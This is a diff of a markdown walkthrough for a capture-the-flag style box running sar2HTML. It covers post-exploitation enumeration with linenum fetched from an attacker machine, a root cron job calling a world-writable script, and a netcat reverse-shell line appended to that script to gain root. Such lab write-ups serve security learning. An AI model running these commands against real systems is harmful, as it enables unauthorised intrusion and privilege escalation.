@@ -174,7 +174,8 @@ Or we could have explored the file system, did some digging in PHP and see if we
 Now that we've got a webshell, we need to enumerate the box.  We're on an Ubunto box, so a few things should jump to mind: 1) can I sudo? 2) linenum.sh and 3) is there anything interesting in opt or the home directoies?  The first thing I do is "sudo -l" to see if I can run any commands with root privs.  No luck, I can't sudo.  Let's run linenum.
 
 I like to run linenum 1 of 2 ways: just download it to the victim (put it in /tmp) or run it as is, just pipe the page to bash.  In this case, I used wget to download linenum from my attacker box, added chmod +X, and ran it.  The output is long so here are the highlights:
-```### SYSTEM ##############################################
+```
+### SYSTEM ##############################################
 [-] Kernel information:
 Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 [-] Are permissions on /home directories lax:
@@ -203,18 +204,19 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 */5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
 ```
 Anyone can read local.txt on www-data's home directory, so that's probably the user flag.  And what's that running every 5 minutes?  A script called "finally.sh" in /var/www/html?  Let's go look.
+```
+$ cat finally.sh
+#!/bin/sh
 
->$ cat finally.sh
->#!/bin/sh
->
->./write.sh
-
+./write.sh
+```
 So "finally.sh" just runs "write.sh"...
->$ cat write.sh
->#!/bin/sh
->
->touch /tmp/gateway
+```
+$ cat write.sh
+#!/bin/sh
 
+touch /tmp/gateway
+```
 And all "write.sh" does is touch a directory (to update the modified timestamp).  Can I write to either of these files?  That would be nice.
 ```
 $ ls -al
@@ -228,6 +230,7 @@ drwxr-xr-x 4 www-data www-data  4096 Jul 24 20:37 ..
 drwxr-xr-x 4 www-data www-data  4096 Jan  4 10:13 sar2HTML
 -rwxrwxrwx 1 www-data www-data    30 Jul 24 20:36 write.sh
 ```
+
 Well, anyone can write to "write.sh" so there's out ticket.  But what to write?  Netcat?  Open that shell.sh we used inside of the "sar2HTML" directory? I checked netcat and sure enough it's installed.  This will be easy!  We'll just have netcat execute another bash shell back to us:
 >$ echo "nc 10.10.10.11 9999 -e /bin/bash" >> write.sh
 
